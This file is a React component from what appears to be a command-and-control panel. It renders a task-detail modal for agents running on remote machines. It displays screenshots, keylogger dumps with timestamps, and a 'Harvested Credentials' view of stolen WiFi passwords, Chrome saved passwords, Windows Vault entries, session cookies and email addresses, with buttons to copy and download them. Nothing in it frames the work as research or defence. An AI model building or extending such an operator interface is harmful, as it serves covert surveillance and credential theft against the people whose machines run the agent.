import React from 'react';
import { useQuery } from '@tanstack/react-query';
import { X, Copy, Clock, CheckCircle, XCircle, Download, Loader, Wifi, Key, Lock, User, Mail } from 'lucide-react';
import { format } from 'date-fns';
import toast from 'react-hot-toast';
import { Button } from '../common/Button';
import { Card } from '../common/Card';
import { tasksApi } from '../../lib/api';
import type { Task } from '../../types';
import { cn } from '../../utils/cn';

interface TaskDetailModalProps {
  task: Task | null;
  onClose: () => void;
}

export function TaskDetailModal({ task: initialTask, onClose }: TaskDetailModalProps) {
  if (!initialTask) return null;

  // Fetch full task with results
  const { data: task, isLoading } = useQuery({
    queryKey: ['task', initialTask.id],
    queryFn: () => tasksApi.getById(initialTask.id),
    enabled: !!initialTask.id,
  });

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard`);
  };

  const downloadAsFile = (content: string, filename: string) => {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
    toast.success(`Downloaded ${filename}`);
  };

  // Parse keylog JSON data
  const parseKeylogData = (output: string) => {
    try {
      const data = JSON.parse(output);
      return Array.isArray(data) ? data : [];
    } catch {
      return [];
    }
  };

  // Parse credentials JSON data
  const parseCredentialsData = (output: string) => {
    try {
      const data = JSON.parse(output);
      return data;
    } catch {
      return null;
    }
  };

  // Format key for display
  const formatKey = (key: string) => {
    // Special keys
    const specialKeys: Record<string, string> = {
      '[ctrl_l]': '⌃ Ctrl',
      '[ctrl_r]': '⌃ Ctrl',
      '[shift_l]': '⇧ Shift',
      '[shift_r]': '⇧ Shift',
      '[alt_l]': '⌥ Alt',
      '[alt_r]': '⌥ Alt',
      '[enter]': '↵ Enter',
      '[space]': '⎵ Space',
      '[backspace]': '⌫ Backspace',
      '[tab]': '⇥ Tab',
      '[esc]': '⎋ Esc',
      '[caps_lock]': '⇪ Caps',
    };

    if (specialKeys[key.toLowerCase()]) {
      return specialKeys[key.toLowerCase()];
    }

    // Unicode escape sequences
    if (key.startsWith('\\u')) {
      try {
        return JSON.parse(`"${key}"`);
      } catch {
        return key;
      }
    }

    return key;
  };

  // Check if output is base64 image
  const isBase64Image = (str: string) => {
    return str && (str.startsWith('data:image/') || str.startsWith('iVBORw0K') || str.startsWith('/9j/'));
  };

  const getImageSrc = (output: string) => {
    if (output.startsWith('data:image/')) {
      return output;
    }
    return `data:image/png;base64,${output}`;
  };

  if (isLoading) {
    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
        <div className="absolute inset-0 bg-black/50 backdrop-blur-sm" onClick={onClose} />
        <Card className="relative w-full max-w-4xl">
          <div className="flex items-center justify-center py-12">
            <Loader className="w-8 h-8 animate-spin text-primary-500" />
            <p className="ml-3 text-dark-600">Loading task details...</p>
          </div>
        </Card>
      </div>
    );
  };

  if (!task) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      <div
        className="absolute inset-0 bg-black/50 backdrop-blur-sm"
        onClick={onClose}
      />

      <Card className="relative w-full max-w-4xl max-h-[90vh] overflow-y-auto">
        <div className="flex items-start justify-between mb-6">
          <div>
            <h2 className="text-2xl font-bold text-dark-900 capitalize mb-1">
              {task.task_type.replace('_', ' ')}
            </h2>
            <p className="text-sm text-dark-600">
              Task ID: {task.id}
            </p>
          </div>

          <button
            onClick={onClose}
            className="text-dark-600 hover:text-dark-900 transition-colors"
          >
            <X className="w-6 h-6" />
          </button>
        </div>

        <div className="mb-6">
          <span
            className={cn(
              'inline-flex items-center gap-2 px-4 py-2 rounded-lg font-medium',
              task.status === 'completed' && 'bg-green-500/10 text-green-600',
              task.status === 'failed' && 'bg-red-500/10 text-red-600',
              task.status === 'running' && 'bg-purple-500/10 text-purple-600',
              task.status === 'pending' && 'bg-yellow-500/10 text-yellow-600',
              task.status === 'sent' && 'bg-blue-500/10 text-blue-600'
            )}
          >
            {task.status === 'completed' && <CheckCircle className="w-5 h-5" />}
            {task.status === 'failed' && <XCircle className="w-5 h-5" />}
            {task.status === 'running' && <Clock className="w-5 h-5 animate-spin" />}
            <span className="uppercase tracking-wide">{task.status}</span>
          </span>
        </div>

        <div className="space-y-6">
          <div>
            <h3 className="text-lg font-semibold text-dark-900 mb-3">
              Task Information
            </h3>
            <div className="grid grid-cols-2 gap-4">
              <DetailItem
                label="Agent ID"
                value={task.agent_id}
                onCopy={() => copyToClipboard(task.agent_id, 'Agent ID')}
              />
              <DetailItem
                label="Task Type"
                value={task.task_type}
              />
              <DetailItem
                label="Priority"
                value={`${task.priority} / 10`}
              />
              <DetailItem
                label="Created"
                value={format(new Date(task.created_at), 'PPpp')}
              />
              {task.completed_at && (
                <DetailItem
                  label="Completed"
                  value={format(new Date(task.completed_at), 'PPpp')}
                />
              )}
            </div>
          </div>

          {task.result && (
            <>
              {/* Screenshot Display */}
              {task.task_type === 'screenshot' && task.result.output && isBase64Image(task.result.output) && (
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="text-lg font-semibold text-dark-900">
                      Screenshot
                    </h3>
                    <button
                      onClick={() => {
                        const link = document.createElement('a');
                        link.href = getImageSrc(task.result!.output!);
                        link.download = `screenshot_${task.id.substring(0, 8)}.png`;
                        link.click();
                        toast.success('Downloaded screenshot');
                      }}
                      className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                    >
                      <Download className="w-4 h-4" />
                      Download
                    </button>
                  </div>
                  <div className="bg-dark-50 rounded-lg p-4">
                    <img 
                      src={getImageSrc(task.result.output)} 
                      alt="Screenshot" 
                      className="w-full rounded-lg shadow-lg"
                    />
                  </div>
                </div>
              )}

              {/* Keylog Display - Beautiful Formatted */}
              {task.task_type === 'keylog_dump' && task.result.output && !isBase64Image(task.result.output) && (() => {
                const keylogData = parseKeylogData(task.result.output);
                return keylogData.length > 0 ? (
                  <div>
                    <div className="flex items-center justify-between mb-2">
                      <h3 className="text-lg font-semibold text-dark-900">
                        Keylog Data ({keylogData.length} keystrokes)
                      </h3>
                      <div className="flex gap-2">
                        <button
                          onClick={() => copyToClipboard(task.result!.output || '', 'Keylog')}
                          className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                        >
                          <Copy className="w-4 h-4" />
                          Copy
                        </button>
                        <button
                          onClick={() => downloadAsFile(
                            task.result!.output || '', 
                            `keylog_${task.id.substring(0, 8)}.txt`
                          )}
                          className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                        >
                          <Download className="w-4 h-4" />
                          Download
                        </button>
                      </div>
                    </div>
                    <div className="bg-purple-50 border border-purple-200 rounded-lg p-4 max-h-96 overflow-y-auto">
                      <div className="space-y-2">
                        {keylogData.map((entry: any, idx: number) => (
                          <div key={idx} className="flex items-center gap-3 text-sm">
                            <span className="text-purple-600 font-mono text-xs">
                              {format(new Date(entry.timestamp), 'HH:mm:ss.SSS')}
                            </span>
                            <span className="text-purple-900 font-medium bg-purple-100 px-2 py-1 rounded">
                              {formatKey(entry.key)}
                            </span>
                          </div>
                        ))}
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                    <p className="text-sm text-yellow-800">
                      No keystrokes captured. Make sure the keylogger was started before dumping logs.
                    </p>
                  </div>
                );
              })()}

              {/* Credentials Display - Beautiful Formatted with Fallback */}
              {task.task_type === 'credentials' && task.result.output && !isBase64Image(task.result.output) && (() => {
                const credsData = parseCredentialsData(task.result.output);
                
                // If parsing succeeded, show beautiful display
                if (credsData) {
                  return (
                    <div>
                      <div className="flex items-center justify-between mb-2">
                        <h3 className="text-lg font-semibold text-dark-900">
                          Harvested Credentials
                        </h3>
                        <div className="flex gap-2">
                          <button
                            onClick={() => copyToClipboard(task.result!.output || '', 'Credentials')}
                            className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                          >
                            <Copy className="w-4 h-4" />
                            Copy
                          </button>
                          <button
                            onClick={() => downloadAsFile(
                              task.result!.output || '', 
                              `credentials_${task.id.substring(0, 8)}.txt`
                            )}
                            className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                          >
                            <Download className="w-4 h-4" />
                            Download
                          </button>
                        </div>
                      </div>
                      <div className="space-y-4">
                        {/* System Information */}
                        {credsData.system && (
                          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
                            <h4 className="font-semibold text-blue-900 mb-3 flex items-center gap-2">
                              <User className="w-4 h-4" />
                              System Information
                            </h4>
                            <div className="grid grid-cols-2 gap-2 text-sm">
                              <div><span className="text-blue-700">Hostname:</span> <span className="font-mono text-blue-900">{credsData.system.hostname}</span></div>
                              <div><span className="text-blue-700">Username:</span> <span className="font-mono text-blue-900">{credsData.system.username}</span></div>
                              <div><span className="text-blue-700">Domain:</span> <span className="font-mono text-blue-900">{credsData.system.domain || 'N/A'}</span></div>
                              <div><span className="text-blue-700">OS:</span> <span className="font-mono text-blue-900">{credsData.system.os}</span></div>
                            </div>
                          </div>
                        )}

                        {/* WiFi Passwords */}
                        {credsData.wifi && credsData.wifi.length > 0 ? (
                          <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                            <h4 className="font-semibold text-green-900 mb-3 flex items-center gap-2">
                              <Wifi className="w-4 h-4" />
                              WiFi Networks ({credsData.wifi.length})
                            </h4>
                            <div className="space-y-2 max-h-64 overflow-y-auto">
                              {credsData.wifi.map((network: any, idx: number) => (
                                <div key={idx} className="bg-white p-3 rounded border border-green-300">
                                  <div className="font-mono font-semibold text-green-900">{network.ssid}</div>
                                  <div className="text-sm text-green-700 mt-1">
                                    Password: <span className="font-mono bg-green-100 px-2 py-0.5 rounded">{network.password || '(empty)'}</span>
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        ) : (
                          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                            <h4 className="font-semibold text-gray-700 mb-2 flex items-center gap-2">
                              <Wifi className="w-4 h-4" />
                              WiFi Networks
                            </h4>
                            <p className="text-sm text-gray-600">No saved WiFi networks found</p>
                          </div>
                        )}

                        {/* Chrome Passwords */}
                        {credsData.chrome && credsData.chrome.length > 0 ? (
                          <div className="bg-orange-50 border border-orange-200 rounded-lg p-4">
                            <h4 className="font-semibold text-orange-900 mb-3 flex items-center gap-2">
                              <Lock className="w-4 h-4" />
                              Chrome Saved Passwords ({credsData.chrome.length})
                            </h4>
                            <div className="space-y-2 max-h-64 overflow-y-auto">
                              {credsData.chrome.map((cred: any, idx: number) => (
                                <div key={idx} className="bg-white p-3 rounded border border-orange-300">
                                  <div className="text-sm text-orange-700">
                                    <div><span className="font-semibold">URL:</span> <span className="font-mono">{cred.url}</span></div>
                                    <div><span className="font-semibold">Username:</span> <span className="font-mono">{cred.username}</span></div>
                                    <div><span className="font-semibold">Password:</span> <span className="font-mono bg-orange-100 px-2 py-0.5 rounded">{cred.password}</span></div>
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        ) : (
                          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                            <h4 className="font-semibold text-gray-700 mb-2 flex items-center gap-2">
                              <Lock className="w-4 h-4" />
                              Chrome Saved Passwords
                            </h4>
                            <p className="text-sm text-gray-600">Chrome not installed or no saved passwords</p>
                          </div>
                        )}

                        {/* Windows Vault */}
                        {credsData.windows_vault && credsData.windows_vault.length > 0 && (
                          <div className="bg-purple-50 border border-purple-200 rounded-lg p-4">
                            <h4 className="font-semibold text-purple-900 mb-3 flex items-center gap-2">
                              <Key className="w-4 h-4" />
                              Windows Vault ({credsData.windows_vault.length})
                            </h4>
                            <div className="space-y-2 max-h-64 overflow-y-auto">
                              {credsData.windows_vault.map((vault: any, idx: number) => (
                                <div key={idx} className="bg-white p-3 rounded border border-purple-300">
                                  <div className="text-sm text-purple-700">
                                    <div><span className="font-semibold">Resource:</span> <span className="font-mono">{vault.resource}</span></div>
                                    <div><span className="font-semibold">Username:</span> <span className="font-mono">{vault.username}</span></div>
                                    <div><span className="font-semibold">Password:</span> <span className="font-mono bg-purple-100 px-2 py-0.5 rounded">{vault.password}</span></div>
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}

                        {/* Browser Cookies */}
                        {credsData.browser_cookies && credsData.browser_cookies.length > 0 ? (
                          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                            <h4 className="font-semibold text-yellow-900 mb-3">
                              Session Cookies ({credsData.browser_cookies.length})
                            </h4>
                            <div className="text-xs text-yellow-700 max-h-32 overflow-y-auto">
                              {credsData.browser_cookies.map((cookie: any, idx: number) => (
                                <div key={idx} className="mb-1">
                                  <span className="font-semibold">{cookie.domain}</span>: {cookie.name}
                                </div>
                              ))}
                            </div>
                          </div>
                        ) : (
                          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                            <h4 className="font-semibold text-gray-700 mb-2">
                              Session Cookies
                            </h4>
                            <p className="text-sm text-gray-600">No session cookies found</p>
                          </div>
                        )}

                        {/* Email Addresses */}
                        {credsData.email_addresses && credsData.email_addresses.length > 0 ? (
                          <div className="bg-indigo-50 border border-indigo-200 rounded-lg p-4">
                            <h4 className="font-semibold text-indigo-900 mb-3 flex items-center gap-2">
                              <Mail className="w-4 h-4" />
                              Email Addresses ({credsData.email_addresses.length})
                            </h4>
                            <div className="text-sm text-indigo-700">
                              {credsData.email_addresses.join(', ')}
                            </div>
                          </div>
                        ) : (
                          <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
                            <h4 className="font-semibold text-gray-700 mb-2 flex items-center gap-2">
                              <Mail className="w-4 h-4" />
                              Email Addresses
                            </h4>
                            <p className="text-sm text-gray-600">No email addresses found</p>
                          </div>
                        )}
                      </div>
                    </div>
                  );
                }
                
                // Fallback: Show raw output if parsing failed
                return (
                  <div>
                    <div className="flex items-center justify-between mb-2">
                      <h3 className="text-lg font-semibold text-dark-900">
                        Harvested Credentials (Raw)
                      </h3>
                      <div className="flex gap-2">
                        <button
                          onClick={() => copyToClipboard(task.result!.output || '', 'Credentials')}
                          className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                        >
                          <Copy className="w-4 h-4" />
                          Copy
                        </button>
                        <button
                          onClick={() => downloadAsFile(
                            task.result!.output || '', 
                            `credentials_${task.id.substring(0, 8)}.txt`
                          )}
                          className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                        >
                          <Download className="w-4 h-4" />
                          Download
                        </button>
                      </div>
                    </div>
                    <div className="bg-green-50 rounded-lg p-4 max-h-96 overflow-y-auto">
                      <code className="text-sm font-mono text-green-900 whitespace-pre-wrap break-all">
                        {task.result.output}
                      </code>
                    </div>
                  </div>
                );
              })()}

              {/* Generic Output (fallback for other task types) */}
              {task.result.output && 
               !isBase64Image(task.result.output) && 
               task.task_type !== 'keylog_dump' && 
               task.task_type !== 'credentials' && (
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="text-lg font-semibold text-dark-900">
                      Output
                    </h3>
                    <button
                      onClick={() => copyToClipboard(task.result!.output || '', 'Output')}
                      className="text-primary-600 hover:text-primary-700 text-sm font-medium flex items-center gap-1"
                    >
                      <Copy className="w-4 h-4" />
                      Copy
                    </button>
                  </div>
                  <div className="bg-green-50 rounded-lg p-4 max-h-96 overflow-y-auto">
                    <code className="text-sm font-mono text-green-900 whitespace-pre-wrap break-all">
                      {task.result.output}
                    </code>
                  </div>
                </div>
              )}

              {task.result.error && (
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <h3 className="text-lg font-semibold text-red-600">
                      Error
                    </h3>
                    <button
                      onClick={() => copyToClipboard(task.result!.error || '', 'Error')}
                      className="text-red-600 hover:text-red-700 text-sm font-medium flex items-center gap-1"
                    >
                      <Copy className="w-4 h-4" />
                      Copy
                    </button>
                  </div>
                  <div className="bg-red-50 rounded-lg p-4 max-h-96 overflow-y-auto">
                    <code className="text-sm font-mono text-red-900 whitespace-pre-wrap break-all">
                      {task.result.error}
                    </code>
                  </div>
                </div>
              )}

              {task.result.execution_time !== undefined && (
                <div>
                  <h3 className="text-lg font-semibold text-dark-900 mb-3">
                    Performance
                  </h3>
                  <div className="bg-dark-50 rounded-lg p-4">
                    <div className="flex items-center justify-between">
                      <span className="text-dark-600">Execution Time:</span>
                      <span className="font-mono font-semibold text-dark-900">
                        {task.result.execution_time?.toFixed(3)}s
                      </span>
                    </div>
                  </div>
                </div>
              )}
            </>
          )}

          {/* No results yet */}
          {!task.result && task.status === 'completed' && (
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
              <p className="text-sm text-yellow-800">
                Task completed but no result data available.
              </p>
            </div>
          )}

          {!task.result && task.status !== 'completed' && (
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
              <p className="text-sm text-blue-800">
                Task is {task.status}. Results will appear when completed.
              </p>
            </div>
          )}
        </div>

        <div className="flex gap-3 mt-8 pt-6 border-t border-dark-200">
          <Button variant="secondary" onClick={onClose} className="flex-1">
            Close
          </Button>
        </div>
      </Card>
    </div>
  );
}

interface DetailItemProps {
  label: string;
  value: string;
  onCopy?: () => void;
}

function DetailItem({ label, value, onCopy }: DetailItemProps) {
  return (
    <div className="bg-dark-50 rounded-lg p-3">
      <p className="text-xs text-dark-600 mb-1">{label}</p>
      <div className="flex items-center justify-between">
        <p className="text-sm font-medium text-dark-900 truncate">
          {value}
        </p>
        {onCopy && (
          <button
            onClick={onCopy}
            className="ml-2 text-dark-600 hover:text-primary-600 transition-colors flex-shrink-0"
          >
            <Copy className="w-4 h-4" />
          </button>
        )}
      </div>
    </div>
  );
}